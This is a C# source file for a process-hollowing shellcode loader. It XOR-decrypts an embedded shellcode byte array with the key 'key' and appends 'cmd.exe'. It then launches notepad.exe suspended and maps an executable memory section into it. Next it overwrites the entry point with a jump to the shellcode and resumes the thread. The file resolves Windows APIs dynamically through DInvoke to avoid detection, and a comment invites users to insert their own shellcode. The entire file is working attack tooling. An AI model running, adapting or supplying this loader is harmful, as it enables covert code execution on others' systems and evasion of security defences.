using DInvoke.Execution.DynamicInvoke;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace ProcessHollow
{
    public class Improved
    {

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        //[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        //private static extern int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);


        //[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        //private static extern int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);


        //[DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        //private static extern void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);

        //[DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        //private static extern IntPtr GetCurrentProcess();

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr GetCurrentProcess();

        //[DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        //private static extern void CloseHandle(IntPtr handle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void CloseHandle(IntPtr handle);

        //[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        //private static extern int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address);

        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);

        //[UnmanagedFunctionPointer(CallingConvention.StdCall)]
        //delegate bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);

        //[DllImport("kernel32.dll")]
        //static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        //[DllImport("kernel32.dll", SetLastError = true)]
        //private static extern uint ResumeThread(IntPtr hThread);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint ResumeThread(IntPtr hThread);

        //[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        //private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);


        //[DllImport("kernel32.dll", SetLastError = true)]
        //static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);


        //[DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        //static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumWritten);


        //[DllImport("kernel32.dll")]
        //static extern uint GetLastError();

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint GetLastError();

        public static byte[] target_ = Encoding.ASCII.GetBytes("cmd.exe");
        public static string HollowedProcessX85 = "C:\\Windows\\SysWOW64\\notepad.exe";
        public static void Main(string[] args)
        {
            Improved starter = new Improved();
            starter.Start(args);
        }

        public static string XorWithKey(string text, string key)
        {
            var decrypted = new StringBuilder();

            for (int i = 0; i < (text.Length - 1); i++)
            {
                decrypted.Append((char)((uint)text[i] ^ (uint)key[i % key.Length]));
            }

            return decrypted.ToString();
        }
        //https://github.com/ambray/ProcessHollowing/blob/master/ShellLoader/Loader.cs
        public void Start(string[] args)
        {
            byte[] encrypted_shellcode = new byte[] { 0x97, 0x8D, 0xFB, 0x6B, 0x65, 0x79, 0xB, 0xEC, 0x9C, 0x5A, 0xA5, 0x1D, 0xE0, 0x35, 0x49, 0xE0, 0x37, 0x75, 0xE0, 0x37, 0x6D, 0xE0, 0x17, 0x51, 0x64, 0xD2, 0x33, 0x4D, 0x54, 0x86, 0xC7, 0x59, 0x18, 0x17, 0x67, 0x55, 0x4B, 0xA4, 0xB6, 0x66, 0x64, 0xBE, 0x89, 0x97, 0x2B, 0x3C, 0xEE, 0x2B, 0x7B, 0xEE, 0x33, 0x57, 0xEE, 0x35, 0x7A, 0x1D, 0x9A, 0x23, 0x64, 0xA8, 0x3A, 0xEE, 0x20, 0x4B, 0x64, 0xAA, 0xE0, 0x2C, 0x61, 0x88, 0x5F, 0x30, 0xE0, 0x51, 0xF2, 0x6A, 0xB3, 0x48, 0x94, 0xC9, 0xB8, 0xA4, 0x68, 0x78, 0xAC, 0x5D, 0x99, 0x1E, 0x93, 0x7A, 0x16, 0x9D, 0x42, 0x16, 0x41, 0xC, 0x8F, 0x3D, 0xF2, 0x33, 0x41, 0x78, 0xB8, 0x3, 0xF2, 0x67, 0x2E, 0xF2, 0x33, 0x79, 0x78, 0xB8, 0xEE, 0x7D, 0xE0, 0x64, 0xA9, 0xE2, 0x21, 0x5D, 0x4F, 0x3E, 0x22, 0xA, 0x3C, 0x23, 0x3A, 0x9A, 0x99, 0x34, 0x3A, 0x23, 0xE0, 0x77, 0x92, 0xE6, 0x38, 0x13, 0x6A, 0xE8, 0xFC, 0xD9, 0x65, 0x79, 0x6B, 0x35, 0x11, 0x5A, 0xEE, 0x16, 0xEC, 0x9A, 0xAC, 0xD0, 0x95, 0xCC, 0xC9, 0x33, 0x11, 0xCD, 0xF0, 0xC4, 0xF6, 0x9A, 0xAC, 0x57, 0x63, 0x5, 0x61, 0xE5, 0x82, 0x8B, 0x10, 0x7C, 0xD0, 0x22, 0x6A, 0x19, 0xA, 0x13, 0x6B, 0x36, 0x86, 0xBE, 0x6, 0x18, 0x7, 0x6, 0x57, 0xE, 0x1D, 0x1C, 0x6B }; //insert your shellcode here
            byte[] shellcode = xor(encrypted_shellcode, Encoding.Default.GetBytes("key"));
            byte[] finalshellcode = new byte[shellcode.Length + target_.Length + 1];
            Array.Copy(shellcode, finalshellcode, shellcode.Length);
            Array.Copy(target_, 0, finalshellcode, shellcode.Length, target_.Length);
            finalshellcode[shellcode.Length + target_.Length] = 0;

            Improved ldr = new Improved();
            try
            {
                Console.WriteLine("Loading shellcode....");
                ldr.Load(HollowedProcessX85, finalshellcode);
            }
            catch (Exception e)
            {
                Console.WriteLine("[x] Something went wrong! " + e.Message);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct STARTUPINFO
        {
            uint cb;
            IntPtr lpReserved;
            IntPtr lpDesktop;
            IntPtr lpTitle;
            uint dwX;
            uint dwY;
            uint dwXSize;
            uint dwYSize;
            uint dwXCountChars;
            uint dwYCountChars;
            uint dwFillAttributes;
            uint dwFlags;
            ushort wShowWindow;
            ushort cbReserved;
            IntPtr lpReserved2;
            IntPtr hStdInput;
            IntPtr hStdOutput;
            IntPtr hStdErr;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct LARGE_INTEGER
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_INFO
        {
            public uint dwOem;
            public uint dwPageSize;
            public IntPtr lpMinAppAddress;
            public IntPtr lpMaxAppAddress;
            public IntPtr dwActiveProcMask;
            public uint dwNumProcs;
            public uint dwProcType;
            public uint dwAllocGranularity;
            public ushort wProcLevel;
            public ushort wProcRevision;
        }

        public const uint PageReadWriteExecute = 0x40;
        public const uint PageReadWrite = 0x04;
        public const uint PageExecuteRead = 0x20;
        public const uint MemCommit = 0x00001000;
        public const uint SecCommit = 0x08000000;
        public const uint GenericAll = 0x10000000;
        public const uint CreateSuspended = 0x00000004;
        public const uint DetachedProcess = 0x00000008;
        public const uint CreateNoWindow = 0x08000000;

        public static byte[] xor(byte[] source, byte[] key)
        {
            byte[] decrypted = new byte[source.Length];

            for (int i = 0; i < source.Length; i++)
            {
                decrypted[i] = (byte)(source[i] ^ key[i % key.Length]);
            }

            return decrypted;
        }

        public bool CreateSection(uint size)
        {
            LARGE_INTEGER liVal = new LARGE_INTEGER();
            size_ = round_to_page(size);
            liVal.LowPart = size_;
            var pointer = Generic.GetLibraryAddress("ntdll.dll", "ZwCreateSection");
            var ZwCreateSection = Marshal.GetDelegateForFunctionPointer(pointer, typeof(ZwCreateSection)) as ZwCreateSection;

            long status = ZwCreateSection(ref section_, GenericAll, (IntPtr)0, ref liVal, PageReadWriteExecute, SecCommit, (IntPtr)0);

            return nt_success(status);
        }

        public IntPtr GetCurrent()
        {
            var pointer = Generic.GetLibraryAddress("kernel32.dll", "GetCurrentProcess");
            var GetCurrentProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(GetCurrentProcess)) as GetCurrentProcess;
            return GetCurrentProcess();
        }

        public uint round_to_page(uint size)
        {
            SYSTEM_INFO info = new SYSTEM_INFO();
            var pointer = Generic.GetLibraryAddress("kernel32.dll", "GetSystemInfo");
            var GetSystemInfo = Marshal.GetDelegateForFunctionPointer(pointer, typeof(GetSystemInfo)) as GetSystemInfo;
            GetSystemInfo(ref info);

            return (info.dwPageSize - size % info.dwPageSize) + size;
        }

        public KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, uint protect, IntPtr addr)
        {
            IntPtr baseAddr = addr;
            IntPtr viewSize = (IntPtr)size_;

            var pointer = Generic.GetLibraryAddress("ntdll.dll", "ZwMapViewOfSection");
            var ZwMapViewOfSection = Marshal.GetDelegateForFunctionPointer(pointer, typeof(ZwMapViewOfSection)) as ZwMapViewOfSection;
            long status = ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);

            if (!nt_success(status))
                throw new SystemException("[x] Something went wrong! " + status);

            return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
        }

        public void SetLocalSection(uint size)
        {

            KeyValuePair<IntPtr, IntPtr> vals = MapSection(GetCurrent(), PageReadWriteExecute, IntPtr.Zero);
            if (vals.Key == (IntPtr)0)
                throw new SystemException("[x] Failed to map view of section!");

            localmap_ = vals.Key;
            localsize_ = vals.Value;

        }

        public void CopyShellcode(byte[] buf)
        {
            long lsize = size_;
            if (buf.Length > lsize)
                throw new IndexOutOfRangeException("[x] Shellcode buffer is too long!");

            unsafe
            {
                byte* p = (byte*)localmap_;

                for (int i = 0; i < buf.Length; i++)
                {
                    p[i] = buf[i];
                }
            }
        }

        public PROCESS_INFORMATION StartProcess(string path)
        {
            STARTUPINFO startInfo = new STARTUPINFO();
            PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();

            uint flags = CreateSuspended;// | DetachedProcess | CreateNoWindow;
            //var pointer = Generic.GetLibraryAddress("Kernel32.dll", "CreateProcess");
            //var CreateProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(CreateProcess)) as CreateProcess;
            if (!CreateProcess((IntPtr)0, path, (IntPtr)0, (IntPtr)0, false, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo))
                throw new SystemException("[x] Failed to create process!");
            return procInfo;
        }

        const ulong PatchSize = 0x10;

        public KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
        {
            int i = 0;
            IntPtr ptr;

            ptr = Marshal.AllocHGlobal((IntPtr)PatchSize);

            unsafe
            {
                byte* p = (byte*)ptr;
                byte[] tmp = null;

                if (IntPtr.Size == 4)
                {
                    p[i] = 0xb8; // mov eax, <imm4>
                    i++;
                    Int32 val = (Int32)dest;
                    tmp = BitConverter.GetBytes(val);
                }
                else
                {
                    p[i] = 0x48; // rex
                    i++;
                    p[i] = 0xb8; // mov rax, <imm8>
                    i++;

                    Int64 val = (Int64)dest;
                    tmp = BitConverter.GetBytes(val);
                }

                for (int j = 0; j < IntPtr.Size; j++)
                    p[i + j] = tmp[j];

                i += IntPtr.Size;
                p[i] = 0xff;
                i++;
                p[i] = 0xe0; // jmp [r|e]ax
                i++;
            }

            return new KeyValuePair<int, IntPtr>(i, ptr);
        }

        private IntPtr GetEntryFromBuffer(byte[] buf)
        {
            IntPtr res = IntPtr.Zero;
            unsafe
            {
                fixed (byte* p = buf)
                {
                    uint e_lfanew_offset = *((uint*)(p + 0x3c)); // e_lfanew offset in IMAGE_DOS_HEADERS

                    byte* nthdr = (p + e_lfanew_offset);

                    byte* opthdr = (nthdr + 0x18); // IMAGE_OPTIONAL_HEADER start

                    ushort t = *((ushort*)opthdr);

                    byte* entry_ptr = (opthdr + 0x10); // entry point rva

                    int tmp = *((int*)entry_ptr);

                    rvaEntryOffset_ = (uint)tmp;

                    // rva -> va
                    if (IntPtr.Size == 4)
                        res = (IntPtr)(pModBase_.ToInt32() + tmp);
                    else
                        res = (IntPtr)(pModBase_.ToInt64() + tmp);

                }
            }

            pEntry_ = res;
            return res;
        }

        public IntPtr FindEntry(IntPtr hProc)
        {
            PROCESS_BASIC_INFORMATION basicInfo = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            var pointer = Generic.GetLibraryAddress("ntdll.dll", "ZwQueryInformationProcess");
            var ZwQueryInformationProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(ZwQueryInformationProcess)) as ZwQueryInformationProcess;
            long success = ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);
            if (!nt_success(success))
                throw new SystemException("[x] Failed to get process information!");

            IntPtr readLoc = IntPtr.Zero;
            byte[] addrBuf = new byte[IntPtr.Size];
            if (IntPtr.Size == 4)
            {
                readLoc = (IntPtr)((Int32)basicInfo.PebAddress + 8);
            }
            else
            {
                readLoc = (IntPtr)((Int64)basicInfo.PebAddress + 16);
            }

            IntPtr nRead = IntPtr.Zero;
            pointer = Generic.GetLibraryAddress("kernel32.dll", "ReadProcessMemory");
            var ReadProcessMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(ReadProcessMemory)) as ReadProcessMemory;
            if (!ReadProcessMemory(hProc, readLoc, addrBuf, addrBuf.Length, out nRead) || nRead == IntPtr.Zero)
                throw new SystemException("[x] Failed to read process memory!");

            if (IntPtr.Size == 4)
                readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
            else
                readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            pModBase_ = readLoc;
            if (!ReadProcessMemory(hProc, readLoc, inner_, inner_.Length, out nRead) || nRead == IntPtr.Zero)
                throw new SystemException("[x] Failed to read module start!");

            return GetEntryFromBuffer(inner_);
        }

        public void MapAndStart(PROCESS_INFORMATION pInfo)
        {

            KeyValuePair<IntPtr, IntPtr> tmp = MapSection(pInfo.hProcess, PageReadWriteExecute, IntPtr.Zero);
            if (tmp.Key == (IntPtr)0 || tmp.Value == (IntPtr)0)
                throw new SystemException("[x] Failed to map section into target process!");

            remotemap_ = tmp.Key;
            remotesize_ = tmp.Value;

            KeyValuePair<int, IntPtr> patch = BuildEntryPatch(tmp.Key);
            var pointer = Generic.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
            var WriteProcessMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(WriteProcessMemory)) as WriteProcessMemory;
            pointer = Generic.GetLibraryAddress("kernel32.dll", "GetLastError");
            var GetLastError = Marshal.GetDelegateForFunctionPointer(pointer, typeof(GetLastError)) as GetLastError;
            pointer = Generic.GetLibraryAddress("kernel32.dll", "ReadProcessMemory");
            var ReadProcessMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(ReadProcessMemory)) as ReadProcessMemory;
            try
            {

                IntPtr pSize = (IntPtr)patch.Key;
                IntPtr tPtr = new IntPtr();

                if (!WriteProcessMemory(pInfo.hProcess, pEntry_, patch.Value, pSize, out tPtr) || tPtr == IntPtr.Zero)
                    throw new SystemException("[x] Failed to write patch to start location! " + GetLastError());
            }
            finally
            {
                if (patch.Value != IntPtr.Zero)
                    Marshal.FreeHGlobal(patch.Value);
            }

            byte[] tbuf = new byte[0x1000];
            IntPtr nRead = new IntPtr();
            if (!ReadProcessMemory(pInfo.hProcess, pEntry_, tbuf, 1024, out nRead))
                throw new SystemException("Failed!");
            pointer = Generic.GetLibraryAddress("kernel32.dll", "ResumeThread");
            var ResumeThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(ResumeThread)) as ResumeThread;
            uint res = ResumeThread(pInfo.hThread);
            if (res == unchecked((uint)-1))
                throw new SystemException("[x] Failed to restart thread!");

        }

        public IntPtr GetBuffer()
        {
            return localmap_;
        }
        ~Improved()
        {
            var pointer = Generic.GetLibraryAddress("ntdll.dll", "ZwUnmapViewOfSection");
            var ZwUnmapViewOfSection = Marshal.GetDelegateForFunctionPointer(pointer, typeof(ZwUnmapViewOfSection)) as ZwUnmapViewOfSection;
            if (localmap_ != (IntPtr)0)
                ZwUnmapViewOfSection(section_, localmap_);

        }

        public void Load(string targetProcess, byte[] shellcode)
        {

            PROCESS_INFORMATION pinf = StartProcess(targetProcess);
            FindEntry(pinf.hProcess);

            if (!CreateSection((uint)shellcode.Length))
                throw new SystemException("[x] Failed to create new section!");

            SetLocalSection((uint)shellcode.Length);

            CopyShellcode(shellcode);


            MapAndStart(pinf);
            var pointer = Generic.GetLibraryAddress("kernel32.dll", "CloseHandle");
            var CloseHandle = Marshal.GetDelegateForFunctionPointer(pointer, typeof(CloseHandle)) as CloseHandle;
            CloseHandle(pinf.hThread);
            CloseHandle(pinf.hProcess);

        }

        IntPtr section_;
        IntPtr localmap_;
        IntPtr remotemap_;
        IntPtr localsize_;
        IntPtr remotesize_;
        IntPtr pModBase_;
        IntPtr pEntry_;
        uint rvaEntryOffset_;
        uint size_;
        byte[] inner_;
        public Improved()
        {
            section_ = new IntPtr();
            localmap_ = new IntPtr();
            remotemap_ = new IntPtr();
            localsize_ = new IntPtr();
            remotesize_ = new IntPtr();
            inner_ = new byte[0x1000]; // Reserve a page of scratch space
        }

        private bool nt_success(long v)
        {
            return (v >= 0);
        }


    }
}

